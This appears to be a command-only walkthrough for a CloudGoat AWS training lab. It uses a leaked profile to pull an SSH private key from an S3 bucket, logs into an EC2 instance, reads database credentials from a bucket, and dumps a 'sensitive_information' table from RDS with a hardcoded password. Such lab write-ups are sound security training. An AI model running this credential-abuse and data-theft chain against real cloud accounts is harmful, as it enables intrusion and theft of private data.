`aws configure --profile mcduck`

`aws s3 ls --profile mcduck`

`aws s3 ls s3://<bucket> --recursive --profile mcduck`

`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat . --profile mcduck`

`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat.pub . --profile mcduck`

`aws ec2 describe-instances --profile mcduck --region us-east-1`

`Look for machine with KeyName of cg-ec2-key-pair-rce_web_app and note down the Public IP Address`

`chmod 400 cloudgoat`

`ssh -i cloudgoat ubuntu@<ec2_public_ip>

`sudo apt-get install awscli`

`aws s3 ls`

`aws s3 ls s3://<bucket> --recursive`

`aws s3 cp s3://<bucket>/db.txt .`

`cat db.txt`

`aws rds describe-db-instances --region us-east-1`

`psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat`

`\dt`

`select * from sensitive_information;`
